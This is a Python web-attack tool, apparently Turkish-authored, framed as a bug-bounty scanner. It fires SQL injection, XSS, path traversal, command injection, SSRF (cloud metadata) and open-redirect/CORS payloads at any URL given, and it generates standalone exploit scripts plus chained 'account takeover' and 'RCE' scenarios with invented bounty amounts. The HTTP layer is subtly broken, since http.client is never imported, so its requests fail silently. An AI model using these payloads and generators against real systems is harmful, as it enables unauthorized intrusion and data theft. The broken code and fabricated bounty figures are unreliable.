#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MohacWeb v1.0 ChainHunter - Bug Bounty Edition
import urllib.request,urllib.parse,urllib.error,ssl,socket,re,json,os,sys,time,sqlite3
from datetime import datetime

class C:
    R='\033[91m';G='\033[92m';Y='\033[93m';B='\033[94m';M='\033[95m';Cy='\033[96m';W='\033[97m';BOLD='\033[1m';END='\033[0m'

class Database:
    def __init__(s,db="mohacweb.db"):
        s.db=db
        c=sqlite3.connect(s.db);x=c.cursor()
        x.execute("CREATE TABLE IF NOT EXISTS scans(id INTEGER PRIMARY KEY AUTOINCREMENT,target TEXT,scan_type TEXT,vulns_found INTEGER,chains_found INTEGER,timestamp TEXT)")
        x.execute("CREATE TABLE IF NOT EXISTS vulnerabilities(id INTEGER PRIMARY KEY AUTOINCREMENT,scan_id INTEGER,vuln_type TEXT,severity TEXT,url TEXT,payload TEXT,exploit_code TEXT,steps TEXT,cvss REAL,cwe TEXT,owasp TEXT)")
        x.execute("CREATE TABLE IF NOT EXISTS chains(id INTEGER PRIMARY KEY AUTOINCREMENT,scan_id INTEGER,chain_name TEXT,severity TEXT,cvss REAL,bounty TEXT,steps TEXT)")
        c.commit();c.close()
    def save_scan(s,target,stype,vulns,chains):
        c=sqlite3.connect(s.db);x=c.cursor()
        x.execute("INSERT INTO scans(target,scan_type,vulns_found,chains_found,timestamp)VALUES(?,?,?,?,?)",(target,stype,vulns,chains,datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        sid=x.lastrowid;c.commit();c.close();return sid
    def save_vuln(s,sid,v):
        c=sqlite3.connect(s.db);x=c.cursor()
        x.execute("INSERT INTO vulnerabilities(scan_id,vuln_type,severity,url,payload,exploit_code,steps,cvss,cwe,owasp)VALUES(?,?,?,?,?,?,?,?,?,?)",(sid,v.get('type',''),v.get('severity',''),v.get('url',''),v.get('payload',''),v.get('exploit',''),json.dumps(v.get('steps',[])),v.get('cvss',0),v.get('cwe',''),v.get('owasp','')))
        c.commit();c.close()
    def save_chain(s,sid,ch):
        c=sqlite3.connect(s.db);x=c.cursor()
        x.execute("INSERT INTO chains(scan_id,chain_name,severity,cvss,bounty,steps)VALUES(?,?,?,?,?,?)",(sid,ch.get('name',''),ch.get('sev',''),ch.get('cvss',0),ch.get('bounty',''),json.dumps(ch.get('steps',[]))))
        c.commit();c.close()
    def get_scans(s):
        c=sqlite3.connect(s.db);x=c.cursor();x.execute("SELECT * FROM scans ORDER BY id DESC");r=x.fetchall();c.close();return r

class Http:
    def __init__(s,t=10):s.t=t
    def _conn(s,url):
        p=urllib.parse.urlparse(url);h=p.hostname;port=p.port or(443 if p.scheme=='https' else 80)
        path=p.path+('?'+p.query if p.query else '')
        if p.scheme=='https':
            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
            return http.client.HTTPSConnection(h,port,timeout=s.t,context=ctx),path
        return http.client.HTTPConnection(h,port,timeout=s.t),path
    def get(s,url,headers=None):
        try:
            if not headers:headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            conn,path=s._conn(url);conn.request("GET",path,headers=headers)
            r=conn.getresponse();body=r.read().decode('utf-8',errors='ignore');hdrs=dict(r.getheaders());conn.close()
            return{'code':r.status,'body':body,'headers':hdrs,'error':None}
        except Exception as e:return{'code':0,'body':'','headers':{},'error':str(e)}
    def post(s,url,data,headers=None):
        try:
            if not headers:headers={'User-Agent':'Mozilla/5.0','Content-Type':'application/x-www-form-urlencoded'}
            conn,path=s._conn(url);conn.request("POST",path,body=urllib.parse.urlencode(data),headers=headers)
            r=conn.getresponse();body=r.read().decode('utf-8',errors='ignore');conn.close()
            return{'code':r.status,'body':body,'headers':dict(r.getheaders()),'error':None}
        except Exception as e:return{'code':0,'body':'','headers':{},'error':str(e)}

class HackerBrain:
    def __init__(s):
        s.vdb={
            'SQL Injection':{'sev':'Critical','cvss':9.8,'cwe':'CWE-89','owasp':'A03:2021 - Injection','steps':['Hedef URL analiz edildi','Parametreler test edildi','SQL payload gonderildi','SQL hata mesaji goruldu','Motor bilgisi sizdirildi','Parametre SQL e ekleniyor','Sorgu calistirilabilir','VERI SIZINTISI RISKI!']},
            'XSS':{'sev':'High','cvss':6.1,'cwe':'CWE-79','owasp':'A03:2021 - Injection','steps':['URL analiz edildi','Parametre belirlendi','XSS payload gonderildi','Filtreleme yok','HTML render edildi','JS calisiyor','Cookie hirsizligi','OTURUM RISKI!']},
            'Path Traversal':{'sev':'High','cvss':7.5,'cwe':'CWE-22','owasp':'A01:2021','steps':['URL analiz edildi','Dosya parametresi tespit','Payload gonderildi','Dizin kontrolu yok','Sistem dosyalarina erisim','/etc/passwd okundu','Tum erisim','SUNUCU ELE GECIRILEBILIR!']},
            'Command Injection':{'sev':'Critical','cvss':10.0,'cwe':'CWE-78','owasp':'A03:2021','steps':['URL analiz edildi','Komut parametresi tespit','CMDi payload gonderildi','Komut calistirildi','Cikti gorundu','Sistem komutlar calisir','Reverse shell','UZAKTAN KOD CALISTIRMA!']},
            'Open Redirect':{'sev':'Medium','cvss':5.4,'cwe':'CWE-601','owasp':'A01:2021','steps':['URL analiz edildi','Redirect parametresi','Harici domain payload','Yonlendirme yapildi','Phishing kullanilabilir','Token calinabilir','PHISHING RISKI!']},
            'CORS Misconfiguration':{'sev':'Medium','cvss':5.3,'cwe':'CWE-942','owasp':'A05:2021','steps':['URL analiz edildi','Origin header','ACAO kontrol','Her origin kabul','Cross-origin okuma','Token calinabilir','VERI SIZINTISI!']},
            'IDOR':{'sev':'High','cvss':7.5,'cwe':'CWE-639','owasp':'A01:2021','steps':['URL analiz edildi','ID parametreleri','Farkli ID test','Veri goruldu','Yetki kontrolu yok','Veri okunabilir','HESAP ELE GECIRME!']},
            'SSRF':{'sev':'Critical','cvss':9.1,'cwe':'CWE-918','owasp':'A10:2021','steps':['URL analiz edildi','URL parametresi','Ic ag payload','Ic aga istek','Metadata erisildi','Credential alindi','ALTYAPI ELE!']},
            'GraphQL Introspection':{'sev':'Medium','cvss':5.3,'cwe':'CWE-200','owasp':'A01:2021','steps':['/graphql test','Introspection sorgu','Schema dondu','Tum tipler','Gizli endpoint','YAPI IFSALANDI!']},
            'WAF Detected':{'sev':'Info','cvss':0.0,'cwe':'N/A','owasp':'A05:2021','steps':['URL analiz','WAF karsilastirma','WAF tespit','Turu belirlendi']},
            'Rate Limiting':{'sev':'Medium','cvss':4.3,'cwe':'CWE-307','owasp':'A07:2021','steps':['URL analiz','Hizli istekler','Rate limit tespit','Bruteforce test']},
            'Subdomain':{'sev':'Info','cvss':0.0,'cwe':'N/A','owasp':'N/A','steps':['Domain analiz','Wordlist','DNS cozum','Subdomainler']},
            'Sensitive File':{'sev':'Medium','cvss':5.3,'cwe':'CWE-538','owasp':'A01:2021','steps':['URL analiz','Dosya yollari','Erisilebilir dosya','Icerik okundu','Credential ele']}
        }
    def explain(s,vtype,url,payload=""):
        i=s.vdb.get(vtype,{'sev':'Medium','cvss':5.0,'cwe':'CWE-000','owasp':'N/A','steps':['Tespit']})
        return{'type':vtype,'severity':i['sev'],'cvss':i['cvss'],'cwe':i['cwe'],'owasp':i['owasp'],'url':url,'payload':payload,'steps':i['steps'],'exploit':''}
    def gen_exploit(s,vtype,url,payload=""):
        exp={
            'SQL Injection':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor p in ["\x27 OR \x271\x27=\x271","\x27 UNION SELECT NULL--"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote(p)\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=10)\n        b=r.read().decode().lower()\n        if "sql" in b:print("[+] SQLi: "+p);break\n    except:pass',
            'XSS':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor p in ["<script>alert(1)</script>","<img src=x onerror=alert(1)>"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote(p)\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=10)\n        if p in r.read().decode():print("[+] XSS: "+p);break\n    except:pass',
            'Path Traversal':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor p in ["../../../../../../etc/passwd"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote(p)\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=10)\n        b=r.read().decode()\n        if "root:" in b:print("[+] PT!\n"+b[:500]);break\n    except:pass',
            'Command Injection':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor sep in [";","|","&&"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote("127.0.0.1"+sep+"id")\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=10)\n        b=r.read().decode()\n        if "uid=" in b:print("[+] CMDi! "+sep);break\n    except:pass',
            'Open Redirect':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor p in ["https://evil.com","//evil.com"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote(p)\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=10)\n        if "evil" in r.geturl():print("[+] Redirect: "+r.geturl());break\n    except:pass',
            'CORS Misconfiguration':'#!/usr/bin/env python3\nimport urllib.request\nT="'+url+'"\nfor o in ["https://evil.com","null"]:\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(T,headers={"User-Agent":"M","Origin":o}),timeout=10)\n        a=r.headers.get("Access-Control-Allow-Origin","")\n        if a==o:print("[+] CORS: "+o);break\n    except:pass',
            'IDOR':'#!/usr/bin/env python3\nimport urllib.request\nT="'+url+'"\nb=T.split("?")[0];p=T.split("?")[1].split("=")[0]\nfor i in range(1,20):\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(b+"?"+p+"="+str(i),headers={"User-Agent":"M"}),timeout=10)\n        if r.getcode()==200:print("[+] ID "+str(i)+" OK")\n    except:pass',
            'SSRF':'#!/usr/bin/env python3\nimport urllib.request,urllib.parse\nT="'+url+'"\nfor p in ["http://169.254.169.254/latest/meta-data/","http://127.0.0.1"]:\n    u=T.split("?")[0]+"?"+T.split("?")[1].split("=")[0]+"="+urllib.parse.quote(p)\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"M"}),timeout=5)\n        b=r.read().decode()\n        if "ami-" in b:print("[+] SSRF! "+p);break\n    except:pass',
            'GraphQL Introspection':'#!/usr/bin/env python3\nimport urllib.request,json\nT="'+url+'"\nq=json.dumps({"query":"{__schema{queryType{name}}}"}).encode()\ntry:\n    r=urllib.request.urlopen(urllib.request.Request(T,data=q,headers={"Content-Type":"application/json"}),timeout=10)\n    d=json.loads(r.read().decode())\n    if "__schema" in str(d):print("[+] GraphQL Introspection ENABLED!")\nexcept:pass'
        }
        return exp.get(vtype,"# N/A")

class ChainEngine:
    def __init__(s):
        s.chains=[
            {'id':1,'name':'ATO via IDOR','requires':['IDOR'],'sev':'Critical','cvss':9.1,'bounty':'$2,000 - $15,000','steps':['IDOR veri alindi','ID enumere','Hedef secildi','Hesap degisti','Hesap ele']},
            {'id':2,'name':'DB Dump SQLi+IDOR','requires':['SQL Injection','IDOR'],'sev':'Critical','cvss':9.8,'bounty':'$5,000 - $25,000','steps':['SQLi motor','IDOR tablo','UNION tablolar','Dump','Hash']},
            {'id':3,'name':'Cloud SSRF','requires':['SSRF'],'sev':'Critical','cvss':9.9,'bounty':'$5,000 - $50,000','steps':['Metadata','Credential','IAM','S3','Altyapi']},
            {'id':4,'name':'Session XSS+CORS','requires':['XSS','CORS Misconfiguration'],'sev':'Critical','cvss':8.8,'bounty':'$3,000 - $10,000','steps':['XSS payload','CORS okuma','Cookie cal','Oturum ac','Kontrol']},
            {'id':5,'name':'RCE CMDi+SSRF','requires':['Command Injection','SSRF'],'sev':'Critical','cvss':10.0,'bounty':'$10,000 - $50,000','steps':['CMDi komut','SSRF ic ag','Shell','Lateral','Sunucu']},
            {'id':6,'name':'Breach GraphQL+IDOR','requires':['GraphQL Introspection','IDOR'],'sev':'Critical','cvss':9.5,'bounty':'$5,000 - $20,000','steps':['Schema','Tipler','Sorgular','Veri','DB']},
            {'id':7,'name':'Phish Redirect+XSS','requires':['Open Redirect','XSS'],'sev':'High','cvss':7.5,'bounty':'$1,000 - $5,000','steps':['Phishing URL','XSS gom','Tikla','Cookie','Hesap']},
            {'id':8,'name':'Internal SSRF+Path','requires':['SSRF','Path Traversal'],'sev':'Critical','cvss':9.3,'bounty':'$5,000 - $15,000','steps':['Ic ag','Dosya','Credential','DB','Sistem']},
            {'id':9,'name':'Stuffing IDOR','requires':['IDOR'],'sev':'High','cvss':7.0,'bounty':'$1,000 - $5,000','steps':['Rate limit yok','Liste','Bruteforce','Hesaplar']},
            {'id':10,'name':'Exfil CORS+SSRF','requires':['CORS Misconfiguration','SSRF'],'sev':'Critical','cvss':9.0,'bounty':'$5,000 - $20,000','steps':['CORS oku','SSRF servis','Token','Veri']},
            {'id':11,'name':'Takeover SQLi+SSRF','requires':['SQL Injection','SSRF'],'sev':'Critical','cvss':10.0,'bounty':'$10,000 - $50,000','steps':['SQLi DB','SSRF ag','Credential','Lateral','Altyapi']},
            {'id':12,'name':'UXSS XSS+CORS','requires':['XSS','CORS Misconfiguration'],'sev':'Critical','cvss':9.0,'bounty':'$3,000 - $15,000','steps':['Bypass XSS','AJAX','Veri oku','Token']},
            {'id':13,'name':'RCE Path+CMDi','requires':['Path Traversal','Command Injection'],'sev':'Critical','cvss':10.0,'bounty':'$10,000 - $50,000','steps':['Config oku','Shell','Webshell','Kalici']}
        ]
    def analyze(s,found):return[ch for ch in s.chains if all(r in found for r in ch['requires'])]

class Reporter:
    def __init__(s,target):s.target=target
    def html(s,vulns,chains):
        n=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        h='<!DOCTYPE html><html><head><meta charset="utf-8"><title>MohacWeb Report</title>'
        h+='<style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}'
        h+='h1{color:#58a6ff;border-bottom:2px solid #30363d}'
        h+='.v{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:15px;margin:10px 0}'
        h+='.cr{border-left:4px solid #f85149}.hi{border-left:4px solid #d29922}.md{border-left:4px solid #58a6ff}'
        h+='.ch{background:#1a1e24;border:1px solid #f0883e;border-radius:6px;padding:15px;margin:10px 0}'
        h+='pre{background:#0d1117;border:1px solid #30363d;padding:10px;overflow-x:auto}'
        h+='.s{color:#7ee787}.bn{color:#3fb950;font-weight:bold;font-size:18px}'
        h+='.bx{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:20px;display:inline-block;margin:10px;text-align:center}'
        h+='.n{font-size:36px;font-weight:bold}'
        h+='</style></head><body>'
        h+='<h1>MohacWeb v1.0 ChainHunter</h1><p>'+s.target+' | '+n+'</p>'
        h+='<div class="bx"><div class="n" style="color:#f85149">'+str(len(vulns))+'</div>Vulns</div>'
        h+='<div class="bx"><div class="n" style="color:#f0883e">'+str(len(chains))+'</div>Chains</div>'
        h+='<h2>Vulnerabilities</h2>'
        for v in vulns:
            sv=v.get('severity','').lower()
            sc='cr' if sv=='critical' else ('hi' if sv=='high' else 'md')
            h+='<div class="v '+sc+'"><b>'+v.get('type','')+'</b> | CVSS: '+str(v.get('cvss',0))+' | '+v.get('cwe','')+'<br>'
            h+='URL: <code>'+v.get('url','')+'</code><br>Payload: <code>'+v.get('payload','')+'</code>'
            h+='<h3>Steps</h3>'
            for i,st in enumerate(v.get('steps',[]),1):h+='<div class="s">['+str(i)+'] '+st+'</div>'
            h+='<h3>Exploit</h3><pre>'+v.get('exploit','').replace('<','&lt;')+'</pre></div>'
        h+='<h2>Chains</h2>'
        for c in chains:
            sv=c.get('sev','').lower()
            sc='cr' if sv=='critical' else 'hi'
            h+='<div class="ch '+sc+'"><b>'+c.get('name','')+'</b> | CVSS: '+str(c.get('cvss',0))
            h+='<br><span class="bn">Bounty: '+c.get('bounty','')+'</span>'
            h+='<h3>Steps</h3>'
            for i,st in enumerate(c.get('steps',[]),1):h+='<div class="s">['+str(i)+'] '+st+'</div>'
            h+='</div>'
        h+='</body></html>'
        return h
    def md(s,vulns,chains):
        r="# Report\n**Target:** "+s.target+"\n**Date:** "+datetime.now().strftime("%Y-%m-%d")+"\n\n"
        for v in vulns:
            r+="## "+v.get('type','')+"\n**Sev:** "+v.get('severity','')+" | **CVSS:** "+str(v.get('cvss',0))+"\n"
            r+="**CWE:** "+v.get('cwe','')+" | **OWASP:** "+v.get('owasp','')+"\n\n"
            for i,st in enumerate(v.get('steps',[]),1):r+=str(i)+". "+st+"\n"
            r+="\n**PoC:** `"+v.get('payload','')+"`\n\n---\n\n"
        for c in chains:
            r+="## Chain: "+c.get('name','')+"\n**Bounty:** "+c.get('bounty','')+"\n"
            for i,st in enumerate(c.get('steps',[]),1):r+=str(i)+". "+st+"\n"
            r+="\n"
        return r

class Scanner:
    def __init__(s,target):
        s.target=target.rstrip('/');s.http=Http();s.brain=HackerBrain();s.ce=ChainEngine();s.vulns=[]
    def log(s,m,c=C.W):print(c+"[*] "+m+C.END)
    def found(s,vt,url,pl=""):
        i=s.brain.explain(vt,url,pl);s.vulns.append(i)
        print(C.R+C.BOLD+"\n[!] "+vt+" FOUND!"+C.END)
        print(C.Y+"    Sev: "+i['severity']+" | CVSS: "+str(i['cvss'])+" | CWE: "+i['cwe']+C.END)
        print(C.Cy+"    OWASP: "+i['owasp']+C.END)
        print(C.G+"\n    [STEPS]"+C.END)
        for n,st in enumerate(i['steps'],1):print(C.W+"    ["+str(n)+"] "+st+C.END)
        ex=s.brain.gen_exploit(vt,url,pl);i['exploit']=ex
        print(C.M+"\n    [EXPLOIT]"+C.END);print(C.W+ex[:500]+"..."+C.END)
        return i
    def sqli(s):
        s.log("SQLi...",C.Cy)
        for url in [s.target+"/search?q=test"]:
            if '?' not in url:continue
            bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
            for p in ["'","' OR '1'='1","' UNION SELECT NULL--"]:
                r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(p))
                if not r['error']:
                    for e in ['sql syntax','mysql','unclosed quotation','mysqli']:
                        if e in r['body'].lower():s.found('SQL Injection',bp+"?"+pp+"="+urllib.parse.quote(p),p);return True
        for p in ["'","' OR '1'='1"]:
            r=s.http.post(s.target+"/login",{"username":p,"password":"test"})
            if not r['error']:
                for e in ['sql syntax','mysql','unclosed quotation']:
                    if e in r['body'].lower():s.found('SQL Injection',s.target+"/login",p);return True
        s.log("SQLi yok",C.G);return False
    def xss(s):
        s.log("XSS...",C.Cy)
        url=s.target+"/comment?text=test"
        if '?' not in url:s.log("XSS yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        for p in ["<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>"]:
            r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(p))
            if not r['error'] and p in r['body']:s.found('XSS',bp+"?"+pp+"="+urllib.parse.quote(p),p);return True
        s.log("XSS yok",C.G);return False
    def path(s):
        s.log("Path...",C.Cy)
        url=s.target+"/download?file=test"
        if '?' not in url:s.log("Path yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        for p in ["../../../../../../etc/passwd","..%2F..%2F..%2Fetc%2Fpasswd"]:
            r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(p))
            if not r['error'] and 'root:' in r['body']:s.found('Path Traversal',bp+"?"+pp+"="+urllib.parse.quote(p),p);return True
        s.log("Path yok",C.G);return False
    def cmdi(s):
        s.log("CMDi...",C.Cy)
        url=s.target+"/ping?host=127.0.0.1"
        if '?' not in url:s.log("CMDi yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        for sep in [";","|","||","&","&&"]:
            pl="127.0.0.1"+sep+"id"
            r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(pl))
            if not r['error'] and ('uid=' in r['body'] or 'www-data' in r['body']):s.found('Command Injection',bp+"?"+pp+"="+urllib.parse.quote(pl),pl);return True
        s.log("CMDi yok",C.G);return False
    def redirect(s):
        s.log("Redirect...",C.Cy)
        url=s.target+"/redirect?url=test"
        if '?' not in url:s.log("Redirect yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        for p in ["https://evil.com","//evil.com"]:
            r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(p))
            if not r['error']:
                loc=r['headers'].get('Location',r['headers'].get('location',''))
                if 'evil' in loc:s.found('Open Redirect',bp+"?"+pp+"="+urllib.parse.quote(p),p);return True
        s.log("Redirect yok",C.G);return False
    def cors(s):
        s.log("CORS...",C.Cy)
        for o in ["https://evil.com","null"]:
            r=s.http.get(s.target+"/api/data",{'User-Agent':'Mozilla/5.0','Origin':o})
            if not r['error']:
                a=r['headers'].get('Access-Control-Allow-Origin',r['headers'].get('access-control-allow-origin',''))
                if a==o:s.found('CORS Misconfiguration',s.target+"/api/data","Origin: "+o);return True
        s.log("CORS yok",C.G);return False
    def idor(s):
        s.log("IDOR...",C.Cy)
        url=s.target+"/user?id=1"
        if '?' not in url:s.log("IDOR yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        cs=[]
        for uid in [1,2,3]:
            r=s.http.get(bp+"?"+pp+"="+str(uid))
            if not r['error']:cs.append(r['code'])
        if len(cs)>=2 and all(c==200 for c in cs):s.found('IDOR',url,"Sequential IDs");return True
        s.log("IDOR yok",C.G);return False
    def ssrf(s):
        s.log("SSRF...",C.Cy)
        url=s.target+"/fetch?url=test"
        if '?' not in url:s.log("SSRF yok",C.G);return False
        bp=url.split('?')[0];pp=url.split('?')[1].split('=')[0]
        for p in ["http://169.254.169.254/latest/meta-data/","http://127.0.0.1"]:
            r=s.http.get(bp+"?"+pp+"="+urllib.parse.quote(p))
            if not r['error'] and ('ami-' in r['body'] or 'root:' in r['body']):s.found('SSRF',bp+"?"+pp+"="+urllib.parse.quote(p),p);return True
        s.log("SSRF yok",C.G);return False
    def gql(s):
        s.log("GraphQL...",C.Cy)
        for ep in ["/graphql","/graphiql","/api/graphql"]:
            r=s.http.get(s.target+ep)
            if not r['error'] and '__schema' in r['body']:s.found('GraphQL Introspection',s.target+ep,"Introspection");return True
        s.log("GraphQL yok",C.G);return False
    def waf(s):
        s.log("WAF...",C.Cy)
        wafs={'cloudflare':['cf-ray'],'akamai':['akamai'],'aws':['awswaf'],'sucuri':['sucuri']}
        r=s.http.get(s.target+"/?test=<script>alert(1)</script>")
        if r['error']:return False
        hs=str(r['headers']).lower()+r['body'].lower()
        for wn,sgs in wafs.items():
            for sg in sgs:
                if sg in hs:s.log("WAF: "+wn,C.Y);return True
        if r['code'] in [403,429,503]:s.log("WAF detected",C.Y);return True
        s.log("WAF yok",C.G);return False
    def ratelimit(s):
        s.log("Rate...",C.Cy)
        for i in range(20):
            r=s.http.post(s.target+"/login",{"username":"admin","password":"x"+str(i)})
            if r['code']==429 or 'rate' in r['body'].lower():s.log("Rate limit aktif",C.G);return False
        s.found('Rate Limiting',s.target+"/login","No rate limit");return True
    def subdomain(s):
        s.log("Subdomain...",C.Cy)
        domain=s.target.replace('http://','').replace('https://','').split('/')[0]
        base='.'.join(domain.split('.')[-2:])
        found=[]
        for sub in ['www','mail','ftp','admin','test','dev','api','app','blog','shop']:
            try:socket.setdefaulttimeout(2);ip=socket.gethostbyname(sub+"."+base);found.append(sub+"."+base+" -> "+ip);print(C.W+"    "+sub+"."+base+" -> "+ip+C.END)
            except:pass
        if found:return True
        s.log("Subdomain yok",C.G);return False
    def files(s):
        s.log("Files...",C.Cy)
        found=[]
        for f in ['/robots.txt','/.env','/phpinfo.php','/sitemap.xml','/.git/config','/.htaccess','/admin/','/backup/','/config.php']:
            r=s.http.get(s.target+f)
            if r['code']==200 and len(r['body'])>50:s.found('Sensitive File',s.target+f,f);found.append(f)
        if not found:s.log("File yok",C.G)
        return len(found)>0
    def full(s):
        s.log("FULL SCAN...",C.R+C.BOLD)
        s.sqli();s.xss();s.path();s.cmdi();s.redirect();s.cors();s.idor();s.ssrf();s.gql();s.waf();s.ratelimit();s.files()
        s.log("Bitti: "+str(len(s.vulns))+" acik",C.G+C.BOLD)
    def chain(s):
        s.log("Chain...",C.Cy)
        ft={v['type']:v for v in s.vulns}
        chs=s.ce.analyze(ft)
        if chs:
            print(C.R+C.BOLD+"\n"+"="*50+"\n[!] CHAINS: "+str(len(chs))+"\n"+"="*50+C.END)
            for c in chs:
                print(C.M+"\n[CHAIN "+str(c['id'])+"] "+c['name']+C.END)
                print(C.Y+"    "+c['sev']+" | CVSS: "+str(c['cvss'])+C.END)
                print(C.G+"    Bounty: "+c['bounty']+C.END)
                for i,st in enumerate(c['steps'],1):print(C.W+"    "+str(i)+". "+st+C.END)
            total=0
            for c in chs:
                b=c['bounty'].replace('$','').replace(',','').split(' - ')
                if len(b)==2:total+=int(b[1])
            print(C.G+C.BOLD+"\n    MAX BOUNTY: $"+'{:,}'.format(total)+C.END)
            return chs
        s.log("Chain yok",C.Y);return[]

def banner():
    print(C.R)
    print("  __  __  _   _  ____  __    __    _       _")
    print(" |  \/  || | | |/ ___|| |   / /__ | |__ __| |__")
    print(" | |\/| || |_| |\___ \| |  / / _ \| '_ \___| __|")
    print(" | |  | ||  _  | ___) | | / / (_) | |_) |  | |_")
    print(" |_|  |_||_| |_||____/|_|/_/ \___/|_.__/    \__|")
    print(C.END)
    print(C.Cy+"    v1.0 ChainHunter - Bug Bounty Edition"+C.END)

def main():
    db=Database();sc=None;chs=[];banner()
    while True:
        print(C.BOLD+C.W)
        print("  [1]SQLi [2]XSS [3]Path [4]CMDi [5]Redirect [6]CORS")
        print("  [7]IDOR [8]SSRF [9]GraphQL [10]WAF [11]Rate [12]Sub [13]Files")
        print(C.R+"  [14] FULL SCAN")
        print(C.M+"  [15] CHAIN"+C.G+" [16] CHAIN EXPLOIT"+C.Y+" [17] BOUNTY CALC")
        print(C.Cy+"  [18] HackerOne [19] Bugcrowd [20] HTML Report")
        print(C.B+"  [21] History"+C.W+" [0] Exit"+C.END)
        ch=input(C.Cy+"\n  > "+C.END).strip()
        if ch=='0':break
        if ch in['1','2','3','4','5','6','7','8','9','10','11','12','13','14']:
            t=input(C.W+"  URL: "+C.END).strip()
            if not t:continue
            sc=Scanner(t)
            m={'1':'sqli','2':'xss','3':'path','4':'cmdi','5':'redirect','6':'cors','7':'idor','8':'ssrf','9':'gql','10':'waf','11':'ratelimit','12':'subdomain','13':'files','14':'full'}
            getattr(sc,m[ch])()
            if sc.vulns:
                sid=db.save_scan(t,"Scan",len(sc.vulns),0)
                for v in sc.vulns:db.save_vuln(sid,v)
                print(C.G+"\n  "+str(len(sc.vulns))+" acik kaydedildi"+C.END)
        elif ch=='15':
            if not sc or not sc.vulns:print(C.R+"Once scan!"+C.END);continue
            chs=sc.chain()
            if chs:
                sid=db.save_scan(sc.target,"Chain",len(sc.vulns),len(chs))
                for c in chs:db.save_chain(sid,c)
        elif ch=='16':
            if not chs:print(C.R+"Once chain!"+C.END);continue
            for c in chs:
                print(C.Y+"\n["+c['name']+"]"+C.END)
                for req in c['requires']:
                    for v in sc.vulns:
                        if v['type']==req:print(C.W+v.get('exploit','')+C.END)
        elif ch=='17':
            if not sc:print(C.R+"Once scan!"+C.END);continue
            bm={'SQL Injection':'500-5000','XSS':'150-1000','Path Traversal':'500-5000','Command Injection':'2000-15000','Open Redirect':'150-1000','CORS Misconfiguration':'200-2000','IDOR':'500-5000','SSRF':'500-10000','GraphQL Introspection':'200-2000','Rate Limiting':'150-1000','Sensitive File':'100-500'}
            total=0
            for v in sc.vulns:
                b=bm.get(v['type'],'100-500');p=b.split('-')
                print(C.W+"  "+v['type']+": $"+p[0]+" - $"+p[1]+C.END);total+=int(p[1])
            if chs:
                for c in chs:
                    bp=c['bounty'].replace('$','').replace(',','').split(' - ')
                    if len(bp)==2:total+=int(bp[1])
            print(C.G+C.BOLD+"\n  MAX: $"+'{:,}'.format(total)+C.END)
        elif ch=='18' or ch=='19':
            if not sc:print(C.R+"Once scan!"+C.END);continue
            rep=Reporter(sc.target);r=rep.md(sc.vulns,chs)
            fn="report_"+datetime.now().strftime("%Y%m%d_%H%M%S")+".md"
            with open(fn,'w') as f:f.write(r)
            print(C.G+"Rapor: "+fn+C.END)
        elif ch=='20':
            if not sc:print(C.R+"Once scan!"+C.END);continue
            rep=Reporter(sc.target);h=rep.html(sc.vulns,chs)
            fn="report_"+datetime.now().strftime("%Y%m%d_%H%M%S")+".html"
            with open(fn,'w') as f:f.write(h)
            print(C.G+"HTML: "+fn+C.END)
        elif ch=='21':
            scans=db.get_scans()
            if not scans:print(C.Y+"Yok"+C.END);continue
            for s in scans:print(C.W+"  #"+str(s[0])+" | "+s[1]+" | "+s[2]+" | V:"+str(s[3])+" C:"+str(s[4])+" | "+s[5]+C.END)
        else:print(C.R+"Gecersiz!"+C.END)

if __name__=="__main__":main()
